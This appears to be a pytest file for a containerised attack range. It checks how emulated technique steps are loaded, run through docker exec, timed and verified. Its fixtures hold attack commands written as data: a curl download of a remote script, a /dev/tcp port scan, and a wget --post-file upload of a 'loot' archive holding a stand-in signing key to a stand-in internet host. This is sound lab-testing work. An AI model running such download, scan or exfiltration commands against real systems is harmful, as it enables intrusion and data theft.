"""The path of a range: its loader rules, the docker exec of a step, what happened, timing and the goal check.

Nothing here starts Docker. The steps are read against range one's hosts and
small technique YAMLs written by each test, and the daemon's events are lines
built in the test in the form `docker events --format '{{json .}}'` prints.
"""

import copy
import dataclasses
import hashlib
import io
import json
import tarfile
import textwrap
from pathlib import Path
from types import SimpleNamespace

import pytest

from bluefire_lab.range import engine
from bluefire_lab.range import path as range_path
from bluefire_lab.range import spec as range_spec

RANGE_ONE = Path(__file__).parents[1] / "range" / "range-one.yaml"
GUID = "11111111-2222-3333-4444-555555555555"


def technique(tmp_path: Path, test: str, name: str = "T1000") -> Path:
    """An atomics folder with one technique YAML of one test, given as the lines under its name."""

    folder = tmp_path / "atomics"
    (folder / name).mkdir(parents=True, exist_ok=True)
    (folder / name / f"{name}.yaml").write_text(
        f"attack_technique: {name}\n"
        "display_name: Example\n"
        "atomic_tests:\n"
        "- name: Example test\n"
        f"  auto_generated_guid: {GUID}\n"
        "  description: An example.\n"
        "  supported_platforms: [linux]\n" + textwrap.indent(textwrap.dedent(test), "  "),
        encoding="utf-8",
    )
    return folder


DOWNLOAD = """\
    input_arguments:
      remote_url:
        description: what to fetch
        type: string
        default: https://example.com/a.sh
    executor:
      name: sh
      command: |
        curl -sO #{remote_url}
      cleanup_command: rm -f a.sh
    """

SCAN = """\
    input_arguments:
      host:
        description: host to scan
        type: string
        default: 192.168.1.1
    executor:
      name: bash
      command: for port in 22 80; do (echo >/dev/tcp/#{host}/$port) && echo port $port is open; done
    """

COPY = """\
    input_arguments:
      domain:
        description: target SSH domain
        type: url
        default: target.example.com
    executor:
      name: sh
      command: |
        ssh #{domain} "cat /etc/hostname" > ./out.txt
    """


def a_step(**changes) -> dict:
    step = {
        "id": "s01",
        "technique": "T1000",
        "guid": GUID,
        "name": "Example test",
        "host": "web",
        "account": "webadmin",
        "workdir": "/tmp",
        "args": {"remote_url": "http://inet/a.sh"},
        "cleanup": "after_check",
        "check": {"output_contains": "done"},
    }
    step.update(changes)
    return step


def load(tmp_path: Path, test: str, *steps: dict, goal: dict | None = None) -> range_path.Plan:
    spec = range_spec.load(RANGE_ONE)
    path = {"steps": list(steps)}
    if goal is not None:
        path["goal"] = goal
    return range_path.load(spec, path, technique(tmp_path, test))


def test_a_step_that_reaches_a_host_it_shares_a_network_with_loads(tmp_path: Path) -> None:
    plan = load(tmp_path, DOWNLOAD, a_step())

    step = plan.steps[0]
    assert step.attack == ("sh", "-c", "curl -sO http://inet/a.sh")
    assert step.undo == ("sh", "-c", "rm -f a.sh")
    assert plan.upload_host == "inet"


@pytest.mark.parametrize(
    ("test", "step", "message"),
    [
        (
            DOWNLOAD,
            a_step(args={"remote_url": "https://example.org/a.sh"}),
            "step s01: the command names example.org (in a URL, after an @, or in /dev/tcp or /dev/udp), "
            "which is not a host of the spec",
        ),
        (
            DOWNLOAD,
            a_step(args={"remote_url": "http://10.0.0.5/a.sh"}),
            "step s01: the command holds the IP address 10.0.0.5",
        ),
        (
            DOWNLOAD,
            a_step(args={"remote_url": "http://[fd00::1]/a.sh"}),
            "step s01: the command holds the IP address fd00::1",
        ),
        (
            SCAN,
            a_step(host="attacker", account="root", args={"host": "db"}, cleanup="none"),
            "step s01: the command names db (in a URL, after an @, or in /dev/tcp or /dev/udp), "
            "which shares no network with attacker",
        ),
        (
            DOWNLOAD,
            a_step(args={"remote_url": "http://{ip:inet@edge}/a.sh"}),  # pragma: allowlist secret
            "step s01: the input argument remote_url holds {ip:...}, which is filled in only in checks",
        ),
        (
            SCAN,
            a_step(args={"host": "build"}),
            "step s01 (T1000 " + GUID + "): 'Example test' has no published cleanup, so cleanup must be none",
        ),
        (
            DOWNLOAD,
            a_step(args={}),
            "write out every declared input argument, even at its default (remote_url: 'https://example.com/a.sh')",
        ),
        (
            COPY,
            a_step(args={"domain": "deploy@outside"}, cleanup="none"),
            "step s01: the input argument domain names 'outside', which is not a host of the spec",
        ),
        (
            DOWNLOAD,
            a_step(to="outside"),
            "step s01 goes to 'outside', which is not a host of the spec",
        ),
        (
            SCAN,
            a_step(to="build", args={"host": "db"}, cleanup="none"),
            "step s01 reaches db, which its to does not name: add db to the step's to",
        ),
        (
            DOWNLOAD,
            a_step(host="manager"),
            "step s01 runs on 'manager': name a host of the spec other than the manager",
        ),
        (DOWNLOAD, a_step(account="deploy"), "step s01 runs as 'deploy', which is not an account of web"),
        (DOWNLOAD, a_step(timeout=0), "step s01: timeout must be a number of seconds from 1 to 3600"),
        (
            DOWNLOAD,
            a_step(cleanup="later"),
            "cleanup is one of after_check, after_path, none",
        ),
        (
            DOWNLOAD,
            a_step(check={"host": "web", "run": "grep -q {ip:attacker@inside} /var/log/auth.log"}),
            "step s01: check: {ip:attacker@inside} must name a host of the spec and one of its networks",
        ),
    ],
)
def test_the_loader_refuses_a_step_and_names_it_and_the_fix(
    tmp_path: Path, test: str, step: dict, message: str
) -> None:
    with pytest.raises(range_spec.SpecError) as refused:
        load(tmp_path, test, step)

    assert message in str(refused.value)


def test_a_test_without_a_published_cleanup_runs_none_although_upstream_gives_an_empty_one(
    tmp_path: Path,
) -> None:
    plan = load(tmp_path, SCAN, a_step(args={"host": "build"}, cleanup="none"))

    assert plan.steps[0].undo is None


def test_two_steps_with_the_same_id_are_refused(tmp_path: Path) -> None:
    with pytest.raises(range_spec.SpecError, match="another step has the same id"):
        load(tmp_path, DOWNLOAD, a_step(), a_step())


def test_the_goal_must_come_after_a_step_of_the_path(tmp_path: Path) -> None:
    goal = {
        "plain": "a file reaches inet",
        "after": "s09",
        "check": {
            "upload": "first",
            "from": "{ip:web@edge}",
            "contains": "a.tar.gz",
            "inner": "b.txt",
            "equals": "build:/etc/b.txt",
        },
    }
    with pytest.raises(range_spec.SpecError, match="after names 's09', which is not a step of the path"):
        load(tmp_path, DOWNLOAD, a_step(), goal=goal)
    goal["after"] = "s01"
    assert load(tmp_path, DOWNLOAD, a_step(), goal=goal).goal.equals == ("build", "/etc/b.txt")


def test_the_step_runs_through_docker_exec_as_its_account_with_the_published_vector_untouched(
    tmp_path: Path,
) -> None:
    step = load(tmp_path, DOWNLOAD, a_step(workdir="/tmp/stage")).steps[0]

    command = range_path.exec_argv("c0ffee", step, "step:s01", step.attack)

    assert command == [
        "docker",
        "exec",
        "--user",
        "webadmin",
        "--workdir",
        "/tmp/stage",
        "--env",
        "HOME=/home/webadmin",
        "--env",
        "USER=webadmin",
        "--env",
        "LOGNAME=webadmin",
        "--env",
        "BLUEFIRE_TAG=step:s01",
        "c0ffee",
        "sh",
        "-c",
        "curl -sO http://inet/a.sh",
    ]
    assert "-i" not in command and "--interactive" not in command
    assert range_path.exec_argv("c0ffee", step, "step:s01", step.attack)[-3:] == list(step.attack)


def test_a_step_as_root_has_roots_home(tmp_path: Path) -> None:
    step = load(
        tmp_path, SCAN, a_step(host="attacker", account="root", args={"host": "web"}, cleanup="none")
    ).steps[0]

    command = range_path.exec_argv("c0ffee", step, "step:s01", step.attack)

    assert command[2:8] == ["--user", "root", "--workdir", "/tmp", "--env", "HOME=/root"]


DOCKER_ERROR = (
    'OCI runtime exec failed: exec failed: unable to start container process: chdir to cwd ("/nope")'
)


@pytest.mark.parametrize(
    ("prereq", "code", "stderr", "check", "stopped", "expected"),
    [
        (True, 0, "", "pass", False, range_path.TOOK_EFFECT),
        (True, 2, "tar: Exiting with failure status", "pass", False, range_path.TOOK_EFFECT),
        (True, 0, "", "fail", False, range_path.NO_EFFECT),
        (True, 127, "sh: 1: wget: not found", "fail", False, range_path.NO_EFFECT),
        (False, None, "", None, False, range_path.NOT_ATTEMPTED),
        (True, 126, DOCKER_ERROR, None, False, range_path.NOT_ATTEMPTED),
        (True, 0, "", "error", False, range_path.INCONCLUSIVE),
        (True, 0, "", None, False, range_path.INCONCLUSIVE),
        (True, None, "", None, True, range_path.INCONCLUSIVE),
        (True, 0, "", "pass", True, range_path.INCONCLUSIVE),
    ],
)
def test_what_happened_follows_the_prereq_the_exit_the_check_and_a_stop(
    prereq: bool, code, stderr: str, check, stopped: bool, expected: str
) -> None:
    assert range_path.happened(prereq, code, stderr, check, stopped)[0] == expected


CONTAINER = "c" * 64
COMMAND = "sh -c curl -sO http://inet/a.sh"


def exec_event(action: str, exec_id: str, nano: int, **attributes: str) -> str:
    """One line of `docker events --format '{{json .}}'` for an exec on a container, as Docker 29 writes it."""

    event = {
        "Type": "container",
        "Action": action,
        "Actor": {
            "ID": CONTAINER,
            "Attributes": {"execID": exec_id, "name": "bluefire-lab-r1-web", **attributes},
        },
        "scope": "local",
        "time": nano // 1_000_000_000,
        "timeNano": nano,
    }
    return json.dumps(event) + "\n"


def test_the_steps_times_are_the_daemons_exec_start_and_exec_die_of_its_command(tmp_path: Path) -> None:
    watch = engine.Watch("bluefire-lab-r1", tmp_path / "events.ndjson", inspect=lambda _: None)
    watch.containers.add(CONTAINER)
    start, end = 1_795_472_122_151_157_163, 1_795_472_123_651_157_163
    watch.feed(
        [
            exec_event("exec_create: sh -c true", "e1", start - 900),
            exec_event("exec_start: sh -c true", "e1", start - 800),
            exec_event("exec_die", "e1", start - 700, exitCode="0"),
            exec_event(f"exec_create: {COMMAND}", "e2", start - 100),
            exec_event(f"exec_start: {COMMAND}", "e2", start),
            exec_event("exec_die", "e2", end, exitCode="2"),
        ]
    )

    record = watch.exec_of(CONTAINER, COMMAND, set())
    times = range_path.daemon_times(record)

    assert times == {
        "started_ns": start,
        "ended_ns": end,
        "seconds": 1.5,
        "daemon_exit_code": 2,
        "exec_id": "e2",
        "time_source": "daemon",
    }
    # A claimed exec is not matched again, and another command on the container is not this one.
    assert watch.exec_of(CONTAINER, COMMAND, {"e2"}) is None
    assert watch.exec_of(CONTAINER, "sh -c false", set()) is None


def test_a_step_whose_exec_has_not_ended_has_no_daemon_times() -> None:
    assert range_path.daemon_times({"exec_id": "a", "start": 5}) == {}
    assert range_path.daemon_times(None) == {}


# s03's test of range one, and the times a loaded Docker daemon gave its exec: exec_die 0.749 s before
# exec_start. The container and exec IDs and the container's name are stand-ins.
UNAME = (
    'uname -a >> "/tmp/T1082.txt"; if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> "/tmp/T1082.txt"; '
    'fi; if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> "/tmp/T1082.txt"; fi; if [ -f '
    '/etc/issue ]; then cat /etc/issue >> "/tmp/T1082.txt"; fi; if [ -f /etc/os-release ]; then cat '
    '/etc/os-release >> "/tmp/T1082.txt"; fi; uptime >> "/tmp/T1082.txt"; cat "/tmp/T1082.txt" 2>/dev/null'
)
MISORDERED = [
    exec_event(f"exec_create: sh -c {UNAME}", "e3", 1_795_554_323_269_207_781),
    exec_event(f"exec_start: sh -c {UNAME}", "e3", 1_795_554_323_271_196_036),
    exec_event("exec_die", "e3", 1_795_554_322_521_993_782, exitCode="0"),
]


def test_a_step_whose_daemon_end_comes_before_its_start_is_timed_by_the_engines_clock(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    step = range_path.Step(
        id="s03",
        technique="T1082",
        guid=GUID,
        name="List OS Information",
        host="web",
        to=(),
        account="webadmin",
        workdir="/tmp",
        args={},
        timeout=60,
        cleanup="none",
        check=None,
        expect=(),
        attack=("sh", "-c", UNAME),
        prereqs=(),
        undo=None,
    )
    watch = engine.Watch("bluefire-lab-r1", tmp_path / "events.ndjson", inspect=lambda _: None)
    watch.containers.add(CONTAINER)
    watch.alive = True
    run = a_sealed_run(tmp_path, watch)
    run.containers = {"web": CONTAINER}

    class Exec:
        """The docker client of the exec: the daemon reports its events while it runs, and it exits 0."""

        returncode = 0

        def __init__(self, *_, **__) -> None:
            watch.feed(MISORDERED)

        def poll(self) -> int:
            return 0

    monkeypatch.setattr(range_path.subprocess, "Popen", Exec)

    found = range_path.Executor(run, range_path.Plan((step,), None, None), {}).exec(
        step, "step:s03", step.attack, 60, tmp_path, "attack"
    )

    assert found["time_source"] == "engine clock (the daemon's exec_die came before its exec_start)"
    assert found["ended_ns"] >= found["started_ns"] and found["seconds"] >= 0
    assert watch.findings == []


def test_a_watch_that_does_not_report_a_steps_exec_in_time_stops_the_path(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    step = range_path.Step(
        id="s03",
        technique="T1082",
        guid=GUID,
        name="List OS Information",
        host="web",
        to=(),
        account="webadmin",
        workdir="/tmp",
        args={},
        timeout=60,
        cleanup="none",
        check=None,
        expect=(),
        attack=("sh", "-c", UNAME),
        prereqs=(),
        undo=None,
    )
    # A stalled `docker events`: the watch still runs, and reports nothing.
    watch = engine.Watch("bluefire-lab-r1", tmp_path / "events.ndjson", inspect=lambda _: None)
    watch.containers.add(CONTAINER)
    watch.alive = True
    monkeypatch.setattr(range_path, "EVENT_SECONDS", 0.1)
    monkeypatch.setattr(range_path, "WATCH_SECONDS", 0.1)
    run = a_sealed_run(tmp_path, watch)
    run.containers = {"web": CONTAINER}

    class Exec:
        returncode = 0

        def __init__(self, *_, **__) -> None:
            pass

        def poll(self) -> int:
            return 0

    monkeypatch.setattr(range_path.subprocess, "Popen", Exec)
    executor = range_path.Executor(run, range_path.Plan((step,), None, None), {})

    found = executor.exec(step, "step:s03", step.attack, 60, tmp_path, "attack")

    assert found["stopped"]
    assert "the event watch did not report the start of the exec of attack on web" in executor.stop_reason()


def test_an_earlier_engine_command_still_running_does_not_stop_a_step_the_watch_reported(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    step = range_path.Step(
        id="s03",
        technique="T1082",
        guid=GUID,
        name="List OS Information",
        host="web",
        to=(),
        account="webadmin",
        workdir="/tmp",
        args={},
        timeout=60,
        cleanup="none",
        check=None,
        expect=(),
        attack=("sh", "-c", UNAME),
        prereqs=(),
        undo=None,
    )
    watch = engine.Watch("bluefire-lab-r1", tmp_path / "events.ndjson", inspect=lambda _: None)
    watch.containers.add(CONTAINER)
    watch.alive = True
    # An effect check that outlived its timeout: its exec_die is still awaited when the next step runs.
    watch.expect("container", "exec_die", required=True, id=CONTAINER)
    monkeypatch.setattr(range_path, "EVENT_SECONDS", 0.1)
    monkeypatch.setattr(range_path, "WATCH_SECONDS", 0.1)
    run = a_sealed_run(tmp_path, watch)
    run.containers = {"web": CONTAINER}

    class Exec:
        returncode = 0

        def __init__(self, *_, **__) -> None:
            watch.feed(
                [
                    exec_event(f"exec_create: sh -c {UNAME}", "e4", 1_795_554_323_269_207_781),
                    exec_event(f"exec_start: sh -c {UNAME}", "e4", 1_795_554_323_271_196_036),
                    exec_event("exec_die", "e4", 1_795_554_323_521_993_782, exitCode="0"),
                ]
            )

        def poll(self) -> int:
            return 0

    monkeypatch.setattr(range_path.subprocess, "Popen", Exec)
    executor = range_path.Executor(run, range_path.Plan((step,), None, None), {})

    found = executor.exec(step, "step:s03", step.attack, 60, tmp_path, "attack")

    assert executor.stop_reason() is None and not found["stopped"]
    assert found["time_source"] == "daemon"


def tar_gz(members: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name, content in members.items():
            info = tarfile.TarInfo(name)
            info.size = len(content)
            archive.addfile(info, io.BytesIO(content))
    return buffer.getvalue()


SECRET = b"SIGNING_KEY=stand-in\n"


def uploads(tmp_path: Path, body: bytes, peer: str = "10.1.0.4") -> Path:
    folder = tmp_path / "uploads"
    folder.mkdir()
    (folder / "1.bin").write_bytes(body)
    (folder / "index.tsv").write_text(f"1 {peer} {hashlib.sha256(body).hexdigest()} {len(body)}\n")
    return folder


def loot(inner: bytes = SECRET) -> bytes:
    stolen = tar_gz({"buildbot/": b"", "buildbot/signing.env": inner, "hostname": b"build\n"})
    return tar_gz({"tmp/stage/etc.tar.gz": stolen})


def goal(folder: Path, peer: str = "10.1.0.4") -> dict:
    return range_path.goal_check(folder, peer, "tmp/stage/etc.tar.gz", "buildbot/signing.env", SECRET)


def test_the_goal_passes_when_the_first_upload_holds_the_hosts_file_byte_for_byte(tmp_path: Path) -> None:
    found = goal(uploads(tmp_path, loot()))

    assert found["passed"], found
    assert found["observed"]["inner_sha256"] == hashlib.sha256(SECRET).hexdigest()


@pytest.mark.parametrize(
    ("body", "peer", "why"),
    [
        (loot(b"SIGNING_KEY=other\n"), "10.1.0.4", "differs from the file on the host"),
        (loot(), "10.1.0.9", "the first upload came from 10.1.0.4, not 10.1.0.9"),
        (tar_gz({"tmp/stage/other.tar.gz": b""}), "10.1.0.4", "the upload holds no tmp/stage/etc.tar.gz"),
        (
            tar_gz({"tmp/stage/etc.tar.gz": tar_gz({"hostname": b"x"})}),
            "10.1.0.4",
            "holds no buildbot/signing.env",
        ),
        (b"not an archive", "10.1.0.4", "an archive could not be read"),
    ],
)
def test_the_goal_fails_and_says_why(tmp_path: Path, body: bytes, peer: str, why: str) -> None:
    found = goal(uploads(tmp_path, body), peer)

    assert not found["passed"]
    assert why in found["why"]


def test_the_goal_fails_without_an_upload_or_with_a_stored_file_that_does_not_match_its_index(
    tmp_path: Path,
) -> None:
    empty = tmp_path / "empty"
    empty.mkdir()
    assert goal(empty)["why"] == "the stand-in internet stored no upload"

    folder = uploads(tmp_path, loot())
    (folder / "1.bin").write_bytes(b"changed")
    assert "does not have the SHA-256 in index.tsv" in goal(folder)["why"]


def a_record(**changes) -> dict:
    record = {
        "id": "s10",
        "host": "web",
        "to": ["inet"],
        "account": "webadmin",
        "workdir": "/tmp",
        "technique": "T1048.002",
        "guid": GUID,
        "name": "Example test",
        "args": {"input_file": "/tmp/loot.tar.gz"},
        "argv": ["sh", "-c", "wget --post-file=/tmp/loot.tar.gz https://inet/upload"],
        "started_ns": 1_795_472_122_151_157_163,
        "ended_ns": 1_795_472_123_651_157_163,
        "started": "2026-11-23T22:15:22.151157Z",
        "ended": "2026-11-23T22:15:23.651157Z",
        "seconds": 1.5,
        "time_source": "daemon",
        "exit_code": 0,
        "happened": range_path.TOOK_EFFECT,
        "why": "the effect check passed",
        "check": {"result": "pass", "parts": []},
    }
    record.update(changes)
    return record


@pytest.mark.parametrize(
    ("phases", "allowed"),
    [
        ([("static", True), ("no way out", True), ("segmentation", True)], True),
        ([("static", True), ("no way out", True)], False),
        ([("static", False), ("no way out", True), ("segmentation", True)], False),
        ([("static", True), ("no way out", True), ("segmentation", False)], False),
    ],
)
def test_the_path_starts_only_once_every_phase_of_the_seal_before_it_has_passed(
    phases, allowed: bool
) -> None:
    recorded = [{"phase": name, "passed": passed, "checks": []} for name, passed in phases]

    assert range_path.sealed(recorded) is allowed


def a_sealed_run(tmp_path: Path, watch: engine.Watch) -> SimpleNamespace:
    """What the executor uses of the engine's run, for a range whose seal passed before the path."""

    phases = [{"phase": name, "passed": True, "checks": []} for name in range_path.BEFORE_PATH]
    record = {"planned": ["s01"], "steps": [], "goal": None, "stopped": None}
    return SimpleNamespace(
        phases=phases, watch=watch, manifest={"path": record}, out=tmp_path, containers={}, write=lambda: None
    )


def test_no_step_starts_once_the_event_watch_has_stopped(tmp_path: Path) -> None:
    plan = load(tmp_path, DOWNLOAD, a_step())
    watch = engine.Watch("bluefire-lab-r1", tmp_path / "events.ndjson", inspect=lambda _: None)
    # The watch ran, and `docker events` has exited since: there is no finding, and nothing watches.
    watch.alive = False
    run = a_sealed_run(tmp_path, watch)

    range_path.Executor(run, plan, {}).run_path()

    assert run.manifest["path"]["steps"] == []
    assert "the event watch on the range stopped" in run.manifest["path"]["stopped"]


def test_a_spec_with_a_path_and_no_built_host_is_refused_with_the_fix(tmp_path: Path) -> None:
    seal_check = RANGE_ONE.parent / "seal-check.yaml"
    spec_file = tmp_path / "seal-check.yaml"
    spec_file.write_text(
        seal_check.read_text(encoding="utf-8")
        + "path:\n  steps:\n    - {id: s01, technique: T1082, host: left}\n",
        encoding="utf-8",
    )
    spec = range_spec.load(spec_file)

    with pytest.raises(range_spec.SpecError, match="build the path's hosts from base or leave the path out"):
        range_path.plan(spec, None)
    assert range_path.plan(range_spec.load(seal_check), None).steps == ()


def test_a_step_on_a_host_that_runs_a_pinned_image_is_refused_with_the_fix(tmp_path: Path) -> None:
    spec = range_spec.load(RANGE_ONE)
    # One host of a spec whose other hosts are built: web runs a pinned image instead.
    spec.hosts["web"] = dataclasses.replace(spec.hosts["web"], image="nginx@sha256:" + "0" * 64)

    with pytest.raises(range_spec.SpecError) as refused:
        range_path.load(spec, {"steps": [a_step()]}, technique(tmp_path, DOWNLOAD))

    assert "step s01 runs on web, which runs a pinned image" in str(refused.value)
    assert "so build web from base or run the step on another host" in str(refused.value)


def test_the_daemons_nanoseconds_are_written_to_the_microsecond_in_utc() -> None:
    assert range_path.iso(1_795_472_122_151_157_163) == "2026-11-23T22:15:22.151157Z"


def test_the_summary_shows_each_step_the_goal_and_the_first_steps_time() -> None:
    manifest = {
        "range": "range-one",
        "path": {
            "steps": [
                a_record(id="s01", seconds=98.2, happened=range_path.TOOK_EFFECT),
                a_record(
                    id="s02",
                    seconds=0.4,
                    time_source="engine clock (the daemon's exec events were not matched)",
                    happened=range_path.NO_EFFECT,
                    check={"result": "fail"},
                ),
            ],
            "goal": {"plain": "a file reaches inet", "passed": True, "why": "byte for byte"},
        },
    }

    text = range_path.summary(manifest)

    assert "| s01 | web | T1048.002 | Example test | 98.2 | 0 | took effect | pass |" in text
    assert "| 0.4 (engine clock) |" in text
    assert "Goal, a file reaches inet: passed." in text
    # The two steps run the same published test, as range one's two port scans do.
    assert "2 steps, which ran 1 published test." in text
    assert "The first step, s01, took 98.2 s." in text


def test_a_fill_puts_in_the_hosts_address_and_a_missing_one_is_an_error() -> None:
    addresses = {"web": {"edge": "10.1.0.4"}}

    assert range_path.fill("^{ip:web@edge} GET", addresses) == "^10.1.0.4 GET"
    with pytest.raises(KeyError):
        range_path.fill("{ip:web@inside}", copy.deepcopy(addresses))
